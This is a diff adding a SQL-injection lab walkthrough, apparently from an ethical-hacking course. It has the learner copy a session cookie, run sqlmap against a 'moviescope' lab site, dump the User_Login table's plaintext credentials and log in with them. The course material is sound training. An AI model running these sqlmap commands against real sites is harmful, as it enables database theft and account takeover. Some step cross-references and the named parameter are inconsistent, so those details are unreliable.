@@ -1,0 +1,36 @@
+Step 1:  The Developer Tools frame appears in the lower section of the browser window. Click the Console tab, type document.cookie in the lowerleft corner of the browser, and press Enter
+
+Step 2: Click the MATE Terminal icon at the top of the Desktop window to open a Parrot Terminal window.
+
+Step 3: In the terminal window, type sudo su and press Enter to run the programs as a root user.
+
+Step 4: In the [sudo] password for attacker field, type a password and press Enter.
+ Note: The password that you type will not be visible.
+
+Step 5: Now, type cd and press Enter to jump to the root directory
+
+Step 6: In the Parrot Terminal window, type sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=”[cookie value that you
+ copied earlier]” --dbs and press Enter.
+ Note: In this query, -u specifies the target URL (the one noted down in Step 6), --cookie specifies the HTTP cookie header value, and --dbs
+ enumerates DBMS databases.
+
+Step 7: The above query causes sqlmap to apply various injection techniques on the name parameter of the URL in an attempt to extract the
+ database information of the MovieScope website
+
+Step 8: The databases present in the MSSQL server. It also displays information about the web server OS, web application
+ technology, and the backend DBMS you can use to query afterward
+
+Step 9: Type sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=”[cookie value which you have copied in Step 8]” -D
+ moviescope --tables and press Enter.
+Note: In this query, -D specifies the DBMS database to enumerate and --tables enumerates DBMS database tables.
+The above query causes sqlmap to scan the moviescope database for tables
+
+Step 10: sqlmap retrieves and displays the table contents of the moviescope. Now, we will retrieve the content of the column User_Login.
+ Type sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie=”[cookie value which you have copied in Step 8]” -D
+ moviescope -T User_Login --dump and press Enter to dump all the User_Login table content.
+
+Step 11: sqlmap retrieves the complete User_Login table data from the database moviescope, containing all users’ usernames under the Uname
+ column and passwords under the password column, as shown in screenshot below. Under the password column, the passwords are shown in plain text.
+
+Step 12: To verify whether the login details are valid, attempt to log in with the extracted login details of any of the users. To do so, switch back to
+ the web browser, close the Developer Tools console, and click Logout to start a new session on the site.
